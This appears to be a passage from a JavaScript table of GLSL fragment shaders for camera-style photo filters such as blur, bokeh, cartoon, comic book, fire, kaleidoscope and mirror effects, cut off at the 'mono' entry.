        "uniform float time;uniform vec2 center;uniform float radius;uniform float width;float r(float d,float w,float o){return(cos(d*0.0174533)+1.0)*w+o;}void main(){vec2 p=texCoord;float attn,outerRadius=radius+width,dist=distance(p*texSize,center);if(dist<radius) attn=0.0;else if(dist>outerRadius) attn=1.0;else attn=pow((dist-radius)/width,1.4);float scale=r(time*0.18,0.045,0.009);for(float i=1.0;i<5.0;i++){p.x+=sin(i*p.x*2.5-time*0.5)*i*scale;}p.y-=0.25;vec3 b=cos((p.y-0.5)*1.570796327)*vec3(sin(p.x*3.0)*0.5+0.5+sin(p.x+p.y)*0.5,(sin(p.x*2.0))*0.5+0.25,cos(p.x*3.0)*0.5+0.25);gl_FragColor=vec4(clamp(texture2D(texture,texCoord).rgb-attn+b*b,0.0,1.0),1.0);}",
    blur:
        "#define DIST 4.0\nuniform vec2 delta;void main(){vec3 c=vec3(0.0);float total=0.0,percent=0.0,weight=0.0,offset=clamp(fract(sin(dot(texCoord*texSize,vec2(12.9898,78.233)))*437.5)-0.5,-0.5,0.5);for(float t=-DIST;t<=DIST;t++){percent=(t+offset)/DIST;weight=1.0-abs(percent);c+=texture2D(texture,texCoord+delta*percent).rgb*weight;total+=weight;}gl_FragColor=vec4(clamp(c/total,0.0,1.0),1.0);}",
    blursimple:
        "const vec3 offset=vec3(0.0,1.3846153846,3.2307692308);const vec3 weight=vec3(0.1362162162,0.18972972972,0.04216216218);void main(){vec4 c=texture2D(texture,texCoord)*weight[0];for(int i=1;i<3;i++){c+=texture2D(texture,texCoord+vec2(0.0,offset[i])/texSize)*weight[i];c+=texture2D(texture,texCoord-vec2(0.0,offset[i])/texSize)*weight[i];c+=texture2D(texture,texCoord+vec2(offset[i],0.0)/texSize)*weight[i];c+=texture2D(texture,texCoord-vec2(offset[i],0.0)/texSize)*weight[i];}gl_FragColor=clamp(c,0.0,1.0);}",
    bokeh:
        "#define PI 3.14159265\nuniform sampler2D texture2;uniform float init;uniform float time;uniform vec3 p0;uniform vec3 p1;uniform vec3 p2;uniform vec3 p3;uniform vec3 p4;uniform vec3 p5;uniform vec3 p6;uniform vec3 p7;uniform vec2 center;uniform float radius;vec3 hue(vec3 c,float a){float sa=sin(a*PI),ca=cos(a*PI);vec3 w=(vec3(2.0*ca,-sqrt(3.0)*sa-ca,sqrt(3.0)*sa-ca)+1.0)/3.0;return vec3(dot(c,w.xyz),dot(c,w.zxy),dot(c,w.yzx));}void main(){vec3 c=texture2D(texture,texCoord).rgb;if(init==1.0) c=(c+0.5)*c-0.1;vec2 p=texCoord*texSize;vec3 b0=texture2D(texture2,(p-p0.xy)/p0.z).rgb,b1=vec3(texture2D(texture2,(p-p1.xy)/p1.z).r*1.3);b1.g=b1.b-=0.05;vec3 b2=texture2D(texture2,(p-p2.xy)/p2.z).rgb,b3=texture2D(texture2,(p-p3.xy)/p3.z).rgb,b4=texture2D(texture2,(p-p4.xy)/p4.z).rgb,b5=texture2D(texture2,(p-p5.xy)/p5.z).rgb,b6=texture2D(texture2,(p-p6.xy)/p6.z).rgb,b7=texture2D(texture2,(p-p7.xy)/p7.z).rgb,c1=hue(b0,0.1)+b1+hue(b2,-0.1)+hue(b3,-0.2)+b4*0.3+b5*0.5+b6*1.5+b7;gl_FragColor=vec4(clamp(c+hue(c1,time*0.2)*distance(texCoord*texSize,center)/radius,0.0,1.0),1.0);}",
    bulge:
        "#define PI 3.14159265\nuniform vec2 center;uniform float radius;uniform float strength;uniform float mode;void main(){vec2 p=texCoord*texSize-center;float distance=length(p);if(distance<radius){float percent=distance/radius;if(mode==1.0){if(strength>0.0) p*=mix(1.0,smoothstep(0.0,1.0/percent,percent),strength*0.75);else p*=mix(1.0,pow(percent,1.0+strength*0.75)/percent,1.0-percent);} else{float trigRatio=(cos(percent*PI)+1.0)/2.0*strength;p=trigRatio+p*(1.0-trigRatio);}}gl_FragColor=texture2D(texture,(p+center)/texSize);}",
    cartoon:
        "#define R_LU 0.3\n#define G_LU 0.59\n#define B_LU 0.11\n#define SAT 2.2\nuniform vec4 rect;void main(){vec2 p=texCoord;if(p.x<rect.t||p.x>rect.q||p.y<rect.s||p.y>rect.p) gl_FragColor=vec4(0.0,0.0,0.0,1.0);else{vec3 c=(texture2D(texture,p).rgb-0.5)*1.5+0.8;float lu=c.r*R_LU+c.g*G_LU+c.b*B_LU;if(lu>0.8) c*=1.1;else if(lu>0.6) c*=0.8;else if(lu>0.4) c*=0.6;else if(lu>0.2) c*=0.4;else c=vec3(0.0);gl_FragColor.r=((R_LU+(1.0-R_LU)*SAT)*c.r)+((G_LU-G_LU*SAT)*c.g)+((B_LU-B_LU*SAT)*c.b);gl_FragColor.g=((R_LU-R_LU*SAT)*c.r)+((G_LU+(1.0-G_LU)*SAT)*c.g)+((B_LU-B_LU*SAT)*c.b);gl_FragColor.b=((R_LU-R_LU*SAT)*c.r)+((G_LU-G_LU*SAT)*c.g)+((B_LU+(1.0-B_LU)*SAT)*c.b);gl_FragColor.a=1.0;}}",
    cartoonink:
        "uniform vec2 size;void main(){float big=0.0,small=0.0,c;for(float x=-1.0;x<=1.0;x+=1.0){for(float y=-1.0;y<=1.0;y+=1.0){c=texture2D(texture,texCoord+size*vec2(x,y)).g;big+=c;if(x==0.0||y==0.0) small+=c;}}float edge=max(0.0,big/9.0-small/5.0);gl_FragColor=vec4(max(vec3(0.0),texture2D(texture,texCoord).rgb-(edge*edge*4000.0)),1.0);}",
    citrus:
        "const vec3 g1=vec3(1.0,0.8,0.6);const vec3 g2=vec3(1.0,0.6,0.8);void main(){vec3 c=(texture2D(texture,texCoord).rgb-0.5)*1.8+0.5;c=vec3(c.r*0.3+c.g*0.59+c.b*0.11);vec3 g=mix(g1,g2,(texCoord.x+(1.0-texCoord.y))/2.0);gl_FragColor=vec4(1.0-(1.0-c)*(1.0-g),1.0);}",
    cocktail:
        "#define R_LU 0.3\n#define G_LU 0.59\n#define B_LU 0.11\n#define SAT 1.75\nuniform sampler2D texture2;float dodge(float c0,float c1){return(c1==1.0)?c1:min(c0/(1.0-c1),1.0);}float burn(float c0,float c1){return(c1==0.0)?c1:max((1.0-(1.0-c0)/c1),0.0);}float vivid(float c){return(c<0.5)?burn(c,(2.0*c)):dodge(c,(2.0*(c-0.5)));}void main(){vec3 c=1.0-(1.0-texture2D(texture,texCoord).rgb*0.5)*(1.0-texture2D(texture2,texCoord).rgb*0.8);c=vec3(vivid(c.r),vivid(c.g),vivid(c.b));vec3 c0;c0.r=((R_LU+(1.0-R_LU)*SAT)*c.r)+((G_LU-G_LU*SAT)*c.g)+((B_LU-B_LU*SAT)*c.b);c0.g=((R_LU-R_LU*SAT)*c.r)+((G_LU+(1.0-G_LU)*SAT)*c.g)+((B_LU-B_LU*SAT)*c.b);c0.b=((R_LU-R_LU*SAT)*c.r)+((G_LU-G_LU*SAT)*c.g)+((B_LU+(1.0-B_LU)*SAT)*c.b);gl_FragColor=vec4(clamp(c0,0.0,1.0),1.0);}",
    cocktailborder:
        "uniform sampler2D texture2;uniform vec4 rect;uniform float rotate;void main(){vec2 p=texCoord*1.05-0.025,bp=texCoord;if(square==1.0){bp.x*=texSize.x/texSize.y;bp.x-=(texSize.x-texSize.y)*0.5/texSize.y;}vec3 b=vec3(texture2D(texture2,rotate==1.0?bp.yx:bp).r),c;if(p.x<rect.t||p.x>rect.q||p.y<rect.s||p.y>rect.p) c=vec3(1.0);else c=texture2D(texture,p).rgb;gl_FragColor=vec4(c*b,1.0);}",
    cocoa:
        "#define R_LU 0.4\n#define G_LU 0.4\n#define B_LU 0.2\n#define SAT 0.5\nuniform sampler2D texture2;uniform float fade;uniform vec4 rect;uniform vec2 center;uniform float radius;uniform float width;const vec3 tint=vec3(0.0,-0.18,-0.28);void main(){vec2 p=texCoord*1.025-0.0125;vec3 c0=1.0-(1.0-texture2D(texture,p).rgb)*(1.0-texture2D(texture2,p).rgb);vec3 c;c.r=((R_LU+(1.0-R_LU)*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.g=((R_LU-R_LU*SAT)*c0.r)+((G_LU+(1.0-G_LU)*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.b=((R_LU-R_LU*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU+(1.0-B_LU)*SAT)*c0.b);c+=tint*(1.0-c);float bc=0.0,dist=distance(p*texSize,center),attn;if(texCoord.x<rect.t) bc=(rect.t-texCoord.x)*fade;else if(texCoord.x>rect.q) bc=(texCoord.x-rect.q)*fade;if(texCoord.y<rect.s) bc+=(rect.s-texCoord.y)*fade;else if(texCoord.y>rect.p) bc+=(texCoord.y-rect.p)*fade;if(dist<radius) attn=1.0;else if(dist>radius+width) attn=0.0;else attn=1.0-pow((dist-radius)/width,1.4);gl_FragColor=vec4(clamp((c*vec3(attn,attn-0.09,attn-0.14)-bc),0.0,1.0),1.0);}",
    colorghost: "uniform sampler2D frame1;uniform sampler2D frame2;void main(){gl_FragColor=vec4(texture2D(texture,texCoord).r,texture2D(frame2,texCoord).g,texture2D(frame1,texCoord).b,1.0);}",
    comicbook:
        "uniform float quad;uniform vec2 center;uniform float size;uniform vec4 rect;uniform float wide;float pattern(vec2 p,float c,float s){p=vec2(p.x*c-p.y*s,p.x*s+p.y*c)*size;return sin(p.x)*sin(p.y)*4.0;}void main(){vec2 p=texCoord;if(quad==1.0){float s=0.5/(1.0-texSize.y/2.0/texSize.x);if(square==1.0){p.x*=texSize.y/texSize.x;p.x+=(texSize.x-texSize.y)/texSize.x/2.0;if(wide==1.0){p.x*=s;p.x+=s/8.0;}}if(wide==1.0){p.y*=s;p.y+=s/8.0;}}if(p.x<rect.t||p.x>rect.q||p.y<rect.s||p.y>rect.p) gl_FragColor=vec4(1.0);else{if(quad != 1.0) p=p*1.04-0.02;vec3 cmy=0.4-(texture2D(texture,p).rgb-0.5)*1.5;if(quad==1.0) p=gl_FragCoord.xy-center;else p=texCoord*texSize-center;float k=min(cmy.x,min(cmy.y,cmy.z));cmy=clamp((cmy-k)/(1.0-k)*10.0-3.0+vec3(pattern(p,0.707113419,0.707100143),pattern(p,-0.258812343,0.965927622),pattern(p,0.866025404,0.5)),0.0,1.0);k=1.0-clamp(k*10.0-5.0+pattern(p,0.25882693,0.965923714),0.0,1.0);gl_FragColor=vec4(clamp(k-clamp(cmy,0.0,1.0),0.0,1.0),1.0);}}",
    comicstripborder:
        "uniform vec4 rect;uniform vec2 border;uniform float wide;void main(){vec2 p=texCoord;float bc=0.0;if(p.x<rect.t||p.x>rect.q||p.y<rect.s||p.y>rect.p) bc=1.0;if(p.y>0.5-border.y&&p.y<0.5+border.y) bc=1.0;if(p.y>0.5&&p.x>wide-border.x&&p.x<wide+border.x) bc=1.0;if(p.y<0.5&&p.x>1.0-wide-border.x&&p.x<1.0-wide+border.x) bc=1.0;gl_FragColor=bc==1.0?vec4(1.0):texture2D(texture,p);}",
    crosshatch:
        "void main(){vec3 c=(texture2D(texture,texCoord).rgb-0.5)*1.5+0.7;float lu=c.r*0.3+c.g*0.59+c.b*0.11,p0=gl_FragCoord.x+gl_FragCoord.y,p1=gl_FragCoord.x-gl_FragCoord.y,h=1.0;if(lu<0.75&&mod(p0,8.0)==0.0||lu<0.5&&mod(p1,8.0)==0.0||lu<0.4&&mod(p0-4.0,8.0)==0.0||lu<0.3&&mod(p1-4.0,8.0)==0.0||lu<0.2&&mod(p0-2.0,4.0)==0.0||lu<0.1&&mod(p1-2.0,4.0)==0.0) h=0.0;gl_FragColor=vec4(h,h,h,1.0);}",
    danger:
        "uniform float fade;uniform vec4 rect;uniform vec2 center;uniform float radius;uniform vec2 stripe;float rand(vec2 r){return clamp(fract(sin(dot(r,vec2(12.9898,78.233)))*437.5),0.0,1.0);}void main(){vec2 p=texCoord;float bc=0.0;if(texCoord.x<rect.t) bc=(rect.t-texCoord.x)*fade;else if(texCoord.x>rect.q) bc=(texCoord.x-rect.q)*fade;if(texCoord.y<rect.s) bc+=(rect.s-texCoord.y)*fade;else if(texCoord.y>rect.p) bc+=(texCoord.y-rect.p)*fade;p=p*1.05-0.025;vec3 c=(texture2D(texture,p).rgb-0.5)*3.0+1.5;c=vec3(c.r*0.3+c.g*0.3+c.b*0.4);if(p.y>=stripe.x&&p.y<stripe.y){c.g=c.b=0.0;c.r=(texture2D(texture,p).r-0.5)*2.5+1.0;}else c-=0.75*rand(vec2(texture2D(texture,p).g,atan(p.x,p.y)));gl_FragColor=vec4(clamp((1.0-distance(p*texSize,center)/radius)*c-bc,0.0,1.0),1.0);}",
    discoblue:
        "#define SIZE 1.2\nuniform vec2 p0;uniform vec2 p1;uniform vec2 p2;uniform vec2 p3;uniform vec2 p4;uniform vec2 p5;uniform vec2 p6;uniform vec2 p7;uniform vec2 p8;void main(){float c=SIZE/length(p0-texCoord);c+=SIZE/length(p1-texCoord);c+=SIZE/length(p2-texCoord);c+=SIZE/length(p3-texCoord);c+=SIZE/length(p4-texCoord);c+=SIZE/length(p5-texCoord);c+=SIZE/length(p6-texCoord);c+=SIZE/length(p7-texCoord);c+=SIZE/length(p8-texCoord);c /= 32.0;vec4 c0=texture2D(texture,texCoord);c0.b=(c0.b+0.1)*c*c-0.1;gl_FragColor=c0;}",
    discogreen:
        "#define SIZE 1.2\nuniform vec2 p0;uniform vec2 p1;uniform vec2 p2;uniform vec2 p3;uniform vec2 p4;uniform vec2 p5;uniform vec2 p6;uniform vec2 p7;uniform vec2 p8;void main(){float c=SIZE/length(p0-texCoord);c+=SIZE/length(p1-texCoord);c+=SIZE/length(p2-texCoord);c+=SIZE/length(p3-texCoord);c+=SIZE/length(p4-texCoord);c+=SIZE/length(p5-texCoord);c+=SIZE/length(p6-texCoord);c+=SIZE/length(p7-texCoord);c+=SIZE/length(p8-texCoord);c /= 32.0;vec4 c0=texture2D(texture,texCoord);c0.g=(c0.g+0.1)*c*c-0.1;gl_FragColor=c0;}",
    discored:
        "#define SIZE 1.2\nuniform vec2 p0;uniform vec2 p1;uniform vec2 p2;uniform vec2 p3;uniform vec2 p4;uniform vec2 p5;uniform vec2 p6;uniform vec2 p7;uniform vec2 p8;void main(){float r=SIZE/length(p0-texCoord);r+=SIZE/length(p1-texCoord);r+=SIZE/length(p2-texCoord);r+=SIZE/length(p3-texCoord);r+=SIZE/length(p4-texCoord);r+=SIZE/length(p5-texCoord);r+=SIZE/length(p6-texCoord);r+=SIZE/length(p7-texCoord);r+=SIZE/length(p8-texCoord);r /= 32.0;vec4 c0=texture2D(texture,texCoord);c0.r=(c0.r+0.1)*r*r-0.1;gl_FragColor=c0;}",
    envy: "const vec3 tint=vec3(0.2,0.0,0.05);const vec3 green=vec3(0.7,1.0,0.7);void main(){vec3 c=texture2D(texture,texCoord*1.025-0.0125).rgb;c=min(c*green*1.1,green);c+=tint*(1.0-c);gl_FragColor=vec4(c,1.0);}",
    envyborder:
        "uniform float fade;uniform vec4 rect;void main(){vec2 p=texCoord;vec3 c=texture2D(texture,p).rgb;float bc=0.0;if(p.x<rect.t) bc=(rect.t-p.x)*fade;else if(p.x>rect.q) bc=(p.x-rect.q)*fade;if(p.y<rect.s) bc+=(rect.s-p.y)*fade;else if(p.y>rect.p) bc+=(p.y-rect.p)*fade;gl_FragColor=vec4(1.0-(1.0-c)*(1.0-bc),1.0);}",
    filmstrip:
        "uniform sampler2D texture2;uniform float frame;uniform float left;uniform float right;vec2 framePos(float f){f=mod(f,36.0);return vec2(floor(f/6.0),mod(f,6.0));}void main(){vec2 p=texCoord;if(texCoord.x<left||texCoord.x>right) gl_FragColor=vec4(0.0);else{p*=6.0;float w=square==1.0?(texSize.x-texSize.y)/2.0/texSize.x:0.0,x=floor(p.x),y=floor(p.y);x=floor(p.x-w*(6.0-(x<3.0?x:x+1.0)*2.0));vec2 f=framePos(frame-x+(y+1.0)*6.0);p.x+=f.x-x+w*(x-2.5)*2.0;p.y+=f.y-y;gl_FragColor=texture2D(texture2,p/6.0);}}",
    fire:
        "#define PI 3.14159265\n#define WAVELENGTH 26.0\n#define AMPLITUDE 0.0125\n#define SPEED 3.0\nuniform sampler2D frame1;uniform sampler2D frame2;uniform sampler2D frame3;uniform sampler2D frame4;uniform sampler2D frame5;uniform sampler2D frame6;uniform float time;uniform float left;uniform float right;const vec3 fire=vec3(0.9,0.3,0.0);const vec3 fire2=vec3(1.2,1.0,0.8);vec3 mod289(vec3 x){return x-floor(x*(1.0/289.0))*289.0;}vec4 mod289(vec4 x){return x-floor(x*(1.0/289.0))*289.0;}vec4 permute(vec4 x){return mod289(((x*34.0)+1.0)*x);}vec4 taylorInvSqrt(vec4 r){return 1.79284291400159-0.85373472095314*r;}vec3 fade(vec3 t){return t*t*t*(t*(t*6.0-15.0)+10.0);}float noise(vec3 P){vec3 Pi0=floor(P),Pi1=Pi0+vec3(1.0);Pi0=mod289(Pi0);Pi1=mod289(Pi1);vec3 Pf0=fract(P),Pf1=Pf0-vec3(1.0);vec4 ix=vec4(Pi0.x,Pi1.x,Pi0.x,Pi1.x),iy=vec4(Pi0.yy,Pi1.yy),iz0=Pi0.zzzz,iz1=Pi1.zzzz,ixy=permute(permute(ix)+iy),ixy0=permute(ixy+iz0),ixy1=permute(ixy+iz1),gx0=ixy0*(1.0/7.0),gy0=fract(floor(gx0)*(1.0/7.0))-0.5;gx0=fract(gx0);vec4 gz0=vec4(0.5)-abs(gx0)-abs(gy0),sz0=step(gz0,vec4(0.0));gx0-=sz0*(step(0.0,gx0)-0.5);gy0-=sz0*(step(0.0,gy0)-0.5);vec4 gx1=ixy1*(1.0/7.0),gy1=fract(floor(gx1)*(1.0/7.0))-0.5;gx1=fract(gx1);vec4 gz1=vec4(0.5)-abs(gx1)-abs(gy1),sz1=step(gz1,vec4(0.0));gx1-=sz1*(step(0.0,gx1)-0.5);gy1-=sz1*(step(0.0,gy1)-0.5);vec3 g000=vec3(gx0.x,gy0.x,gz0.x),g100=vec3(gx0.y,gy0.y,gz0.y),g010=vec3(gx0.z,gy0.z,gz0.z),g110=vec3(gx0.w,gy0.w,gz0.w),g001=vec3(gx1.x,gy1.x,gz1.x),g101=vec3(gx1.y,gy1.y,gz1.y),g011=vec3(gx1.z,gy1.z,gz1.z),g111=vec3(gx1.w,gy1.w,gz1.w);vec4 norm0=taylorInvSqrt(vec4(dot(g000,g000),dot(g010,g010),dot(g100,g100),dot(g110,g110)));g000*=norm0.x;g010*=norm0.y;g100*=norm0.z;g110*=norm0.w;vec4 norm1=taylorInvSqrt(vec4(dot(g001,g001),dot(g011,g011),dot(g101,g101),dot(g111,g111)));g001*=norm1.x;g011*=norm1.y;g101*=norm1.z;g111*=norm1.w;float n000=dot(g000,Pf0),n100=dot(g100,vec3(Pf1.x,Pf0.yz)),n010=dot(g010,vec3(Pf0.x,Pf1.y,Pf0.z)),n110=dot(g110,vec3(Pf1.xy,Pf0.z)),n001=dot(g001,vec3(Pf0.xy,Pf1.z)),n101=dot(g101,vec3(Pf1.x,Pf0.y,Pf1.z)),n011=dot(g011,vec3(Pf0.x,Pf1.yz)),n111=dot(g111,Pf1);vec3 fade_xyz=fade(Pf0);vec4 n_z=mix(vec4(n000,n100,n010,n110),vec4(n001,n101,n011,n111),fade_xyz.z);vec2 n_yz=mix(n_z.xy,n_z.zw,fade_xyz.y);return mix(n_yz.x,n_yz.y,fade_xyz.x);}float diff(vec3 c1,vec3 c2){c1=(c1-c2)*5.0;return clamp(c1.r+c1.g+c1.b,0.2,1.2)-0.2;}void main(){if(texCoord.x<left||texCoord.x>right) gl_FragColor=vec4(0.0);else{vec2 p=texCoord+sin(vec2(noise(vec3(texCoord,time*SPEED)*WAVELENGTH)*PI*AMPLITUDE,noise(vec3(texCoord,(time+1.0)*SPEED)*WAVELENGTH)*PI*AMPLITUDE));vec3 c0=texture2D(texture,p).rgb,c1=texture2D(frame6,p).rgb,c2=texture2D(frame5,p).rgb,c3=texture2D(frame4,p).rgb,c4=texture2D(frame3,p).rgb,c5=texture2D(frame2,p).rgb,c6=texture2D(frame1,p).rgb;float c=diff(c0,c1)*2.0;c+=diff(c1,c2);c+=diff(c2,c3);c+=diff(c3,c4);c+=diff(c4,c5)*0.5;c+=diff(c5,c6)*0.125;gl_FragColor=vec4(texture2D(texture,texCoord).rgb*fire2+c*fire,1.0);}}",
    firevignette:
        "uniform vec2 center;uniform float radius;uniform float width;void main(){float dist=distance(texSize*texCoord,center),attn=smoothstep(radius,radius+width,dist);gl_FragColor=vec4(texture2D(texture,texCoord).rgb-attn*0.6,1.0);}",
    flare:
        "uniform float time;float hl(float c1,float c0){return(c0<0.5?(2.0*c0*c1):(1.0-2.0*(1.0-c0)*(1.0-c1)));}void main(){vec2 p=texCoord-0.2;vec3 c=vec3(0.0);for(float i=0.0;i<4.0;i++){float t=time/4.0+i*3.0;p.y+=sin(p.x*2.0-t)-sin(t)*0.1;p.x+=cos(p.y*3.0-t+cos(t))*0.15;float w=(sin(p.x*10.0)+sin(i*0.1)+p.y*8.0);float z=1.0/sqrt(abs(w))*(abs(sin(time*0.1+2.0))*0.5+2.0);c+=vec3(z*0.2,z*0.1,z*0.025);}vec3 c0=texture2D(texture,texCoord).rgb;c=vec3(hl(c0.r,c.r),hl(c0.g,c.g),hl(c0.b,c.b));gl_FragColor=vec4(clamp(c0*c0+c*0.5,0.0,1.0),1.0);}",
    fragment:
        "#define SIZE 8.0\n#define ZOOM 0.35\nvoid main(){float x=texCoord.x,y=texCoord.y,sy=SIZE*0.75;float sx=square==1.0?SIZE:sy;vec2 p=vec2(x*(1.0-ZOOM)-ZOOM/sx*0.5,y*(1.0-ZOOM)-ZOOM/sy*0.5);for(float i=SIZE;i>=0.0;i--){if(x>i/sx) p.x+=ZOOM/sx;if(y>i/sy) p.y+=ZOOM/sy;}gl_FragColor=texture2D(texture,p);}",
    glaze:
        "uniform vec2 size;uniform float time;float r(float d,float w,float o){return(cos(d*0.0174533)+1.0)*w+o;}void main(){vec2 p=gl_FragCoord.xy/size;float scale=r(time,0.1875,0.375),xo=r(time*0.2,2.5,5.0),yo=r(time*0.2,5.0,5.0),tp=time*0.05;for(float i=1.0;i<51.0;i++){p.x-=sin(p.x*i+tp)*scale/i-xo;p.y-=sin(p.y*i+tp)*scale/i-yo;}gl_FragColor=vec4(clamp(vec3(sin(p.x*3.0)*0.5+0.5,sin(p.y*3.0)*0.5+0.5,sin(p.x+p.y)),0.2,1.0),1.0);}",
    glitch:
        "uniform float pixelSize;uniform vec2 center;uniform float width;void main(){vec4 c=texture2D(texture,texCoord),pixel=texture2D(texture,(vec2(ivec2(texSize*texCoord/pixelSize))+0.5+1.0/pixelSize)/texSize*pixelSize);float attn=clamp(distance(texSize*texCoord,center)/width,0.0,1.0);c=((1.0-attn)*c+attn*pixel);c.rgb=(c.rgb-0.5)*2.0+0.75;gl_FragColor=vec4(c.rgb,1.0);}",
    halo:
        "#define RADIUS 0.4\n#define TWO_PI 6.28318531\n#define X_PRO 0.05\nuniform float time;void main(){vec2 p=(texCoord-vec2(0.5))*texSize/texSize.y;float r=length(p*8.0),a=atan(p.y+1.5,p.x),t=time+50.0/(r+1.0),d=abs(0.05/(sin(t)+sin(time+a*8.0)))*28.0;vec3 c=vec3(-sin(r*5.0-a-time+sin(r+t)),sin(r*3.0+a-cos(time)+sin(r+t)),cos(r+a*2.0+log(5.001-(a/4.0))-time)+sin(r+t));float dist=length(p);if(dist<RADIUS) c+=(dist-RADIUS)*11.0;vec3 c0=texture2D(texture,texCoord).rgb;c0.r-=sin(c0.r*TWO_PI)*X_PRO;c0.g-=sin(c0.g*TWO_PI)*X_PRO;c0.b+=sin(c0.b*TWO_PI)*X_PRO;gl_FragColor=vec4(c0+clamp(c*d*0.2,0.0,1.0),1.0);}",
    hazydays:
        "uniform sampler2D texture2;uniform float rotate;const vec3 offset=vec3(0.22,0.07,0.28);const vec3 haze=vec3(1.0,0.78,0.24);void main(){vec2 bp=texCoord;if(square==1.0){bp.x*=texSize.x/texSize.y;bp.x-=(texSize.x-texSize.y)*0.5/texSize.y;}vec2 p=texCoord*1.05-0.025;vec3 c=texture2D(texture,p).rgb;float b=texture2D(texture2,rotate==1.0?bp.yx:bp).r;c=min(c*haze*1.3,haze);c+=offset*(1.0-c);gl_FragColor=vec4(1.0-(1.0-c)*(1.0-b),1.0);}",
    hotpink: "uniform sampler2D texture2;void main(){vec3 c=(texture2D(texture,texCoord).rgb-0.5)*1.5+0.7;gl_FragColor=texture2D(texture2,vec2(c.r*0.3+c.g*0.59+c.b*0.11,0.0));}",
    kaleidoscope:
        "#define DIR 1.570796327\n#define ANGLE 0.523598775\nuniform vec2 center;uniform vec2 offset;void main(){vec2 p=texCoord*texSize-center;float theta=atan(p.y,p.x)+DIR,r=length(p),a=mod(theta,ANGLE);if(mod(floor(theta/ANGLE),2.0)>0.5) a=ANGLE-a;a-=DIR;gl_FragColor=texture2D(texture,(vec2(offset.x+cos(a)*r,offset.y-sin(a)*r))/texSize);}",
    kaleidoscope1: "#define DIR 1.570796327\n#define ANGLE 0.523598775\nuniform vec2 center;void main(){vec2 p=texCoord*texSize-center;float theta=atan(p.y,p.x)+DIR;gl_FragColor=vec4(length(p),mod(theta,ANGLE),theta,1.0);}",
    kaleidoscope2:
        "#define DIR 1.570796327\n#define ANGLE 0.523598775\nuniform sampler2D texture2;uniform vec2 offset;void main(){vec4 k=texture2D(texture,texCoord);float a=k.g;if(mod(floor(k.b/ANGLE),2.0)>0.5) a=ANGLE-a;a-=DIR;gl_FragColor=texture2D(texture2,(vec2(offset.x+cos(a)*k.r,offset.y-sin(a)*k.r))/texSize);}",
    lomo:
        "#define R_LU 0.3\n#define G_LU 0.59\n#define B_LU 0.11\n#define SAT 2.2\nuniform float quad;uniform vec2 center;uniform float radius;uniform float exposure;uniform float fade;uniform vec4 rect;void main(){vec2 p=texCoord;float bc=0.0;if(quad==1.0){if(square==1.0){p.x*=texSize.y/texSize.x;p.x+=(texSize.x-texSize.y)/texSize.x*0.5;}if(p.x<rect.t) bc=(rect.t-p.x)*fade;else if(p.x>rect.q) bc=(p.x-rect.q)*fade;if(p.y<rect.s) bc+=(rect.s-p.y)*fade;else if(p.y>rect.p) bc+=(p.y-rect.p)*fade;p=p*1.03-0.015;}vec3 c0=texture2D(texture,p).rgb,c;c.r=((R_LU+(1.0-R_LU)*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.g=((R_LU-R_LU*SAT)*c0.r)+((G_LU+(1.0-G_LU)*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.b=((R_LU-R_LU*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU+(1.0-B_LU)*SAT)*c0.b);gl_FragColor=vec4((1.0-distance(p*texSize,center)/radius)*c*exposure-bc,1.0);}",
    lsd: "void main(){gl_FragColor=vec4((texture2D(texture,texCoord).rgb-0.5)*24.0+0.7,1.0);}",
    magazine:
        "uniform vec2 center;uniform float size;uniform float sina;uniform float cosa;uniform float fade;uniform vec4 rect;void main(){vec2 p=texCoord*1.04-0.02;vec3 c=(texture2D(texture,p).rgb-0.5)*1.3+0.6;float lu=(c.r*0.3+c.g*0.59+c.b*0.11)*16.0-8.0;if(texCoord.x<rect.t) lu+=(rect.t-texCoord.x)*fade;else if(texCoord.x>rect.q) lu+=(texCoord.x-rect.q)*fade;if(texCoord.y<rect.s) lu+=(rect.s-texCoord.y)*fade;else if(texCoord.y>rect.p) lu+=(texCoord.y-rect.p)*fade;p=texCoord*texSize-center;p=vec2(p.x*cosa-p.y*sina,p.x*sina+p.y*cosa)*size;gl_FragColor=vec4(clamp(vec3(lu+sin(p.x)*sin(p.y)*4.0),0.0,1.0),1.0);}",
    mint:
        "const vec3 g1=vec3(0.6,0.8,1.0);const vec3 g2=vec3(0.6,1.0,0.8);void main(){vec3 c=(texture2D(texture,texCoord).rgb-0.5)*1.8+0.5;c=vec3(c.r*0.3+c.g*0.59+c.b*0.11);vec3 g=mix(g1,g2,(texCoord.x+texCoord.y)/2.0);gl_FragColor=vec4(1.0-(1.0-c)*(1.0-g),1.0);}",
    mirrorbottom: "void main(){vec2 p=texCoord;if(p.y>0.5) p.y=1.0-p.y;gl_FragColor=texture2D(texture,p);}",
    mirrorleft: "void main(){vec2 p=texCoord;if(p.x>0.5) p.x=1.0-p.x;gl_FragColor=texture2D(texture,p);}",
    mirrorquad:
        "void main(){vec2 p=texCoord*2.0;float offset=square==1.0?(texSize.x-texSize.y)/4.0/texSize.x:0.0;p.x=texCoord.x>0.5?(texCoord.x-0.5+offset)*2.0:1.0-p.x+offset*2.0;if(texCoord.y>0.5) p.y=1.0-(texCoord.y-0.5)*2.0;gl_FragColor=texture2D(texture,p);}",
    mirrorright: "void main(){vec2 p=texCoord;if(p.x<=0.5) p.x=1.0-p.x;gl_FragColor=texture2D(texture,p);}",
    mirrortop: "void main(){vec2 p=texCoord;if(p.y<=0.5) p.y=1.0-p.y;gl_FragColor=texture2D(texture,p);}",
    mix: "uniform sampler2D texture2;uniform float strength;void main(){gl_FragColor=clamp(mix(texture2D(texture,texCoord),texture2D(texture2,texCoord),strength),0.0,1.0);}",
    mono:
